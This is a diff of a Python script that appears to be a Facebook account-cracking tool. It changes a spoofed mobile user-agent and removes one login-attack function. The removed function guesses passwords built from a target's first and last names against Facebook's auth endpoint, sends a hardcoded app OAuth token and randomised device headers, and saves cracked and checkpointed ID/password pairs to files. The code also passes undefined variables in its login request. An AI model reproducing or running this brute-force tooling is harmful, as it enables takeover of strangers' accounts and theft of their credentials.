@@ -429,7 +429,7 @@ def api2(ids,names,passlist):
                                         'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':'Mozilla/5.0 (Linux; arm_64; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.12.1 YaSearchBrowser/23.12.1 BroPP/1.0 SA/3 Mobile Safari/537.36',
+                                        'user-agent':'Mozilla/5.0 (Linux; Android 13; SM-G780G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]',
                                         'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
@@ -533,49 +533,6 @@ def api5(ids,names,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass       
-def api6(ids,names,passlist):
-                try:
-                        global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB N] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                        fn = names.split(' ')[0]
-                        try:
-                                ln = names.split(' ')[1]
-                        except:
-                                ln = fn
-                        for pw in passlist:
-                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                                ua = DEL_T()
-                                ads = str(uuid.uuid4())
-                                token = '350'+'685531728|62f8ce'+'9f74b12f84c123cc23437a4a32'
-                                jz = random.choice(['28','29','210'])+''.join(random.choice(digits) for _ in range(2))
-                                mac = str(uuid.uuid4()).replace('-','')[0:25]
-                                sim_code = str(random.randint(2e4,4e4))
-                                x_fb = str(random.randint(2e7,3e7))
-                                device_id = str(uuid.uuid4())
-                                data = {'adid': ads, 'email': sid, 'password': ps, 'cpl': 'true', 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'format': 'json', 'device_id': device_id, 'family_device_id': device_id, 'session_id': device_id, 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'bn_IN', 'client_country_code': 'IN', 'advertising_id': device_id, 'fb_api_req_friendly_name': 'authenticate'}
-                                head = {'Connection': 'keep-alive', 'Authorization': f'OAuth {token}', 'Host': 'b-graph.facebook.com', 'x-fb-connection-bandwidth': x_fb, 'x-fb-net-hni': jz, 'X-fb-sim-hni': jz, 'X-FB-Connection-Quality': 'EXCELLENT', 'x-fb-connection-type': 'WIFI.LTE', 'X-Tigon-Is-Retry': 'False', 'User-Agent':ua , 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'Content-Length': '530'}
-                                q = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
-                                if 'session_key' in q:
-                                        print('\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                                elif 'www.facebook.com' in q['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                        else:
-                                                open('/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                else:
-                                        continue
-                        loop+=1
-                except requests.exceptions.ConnectionError:
-                        time.sleep(10)
-                except Exception as e:
-                        pass  
 
 try:
         menu()
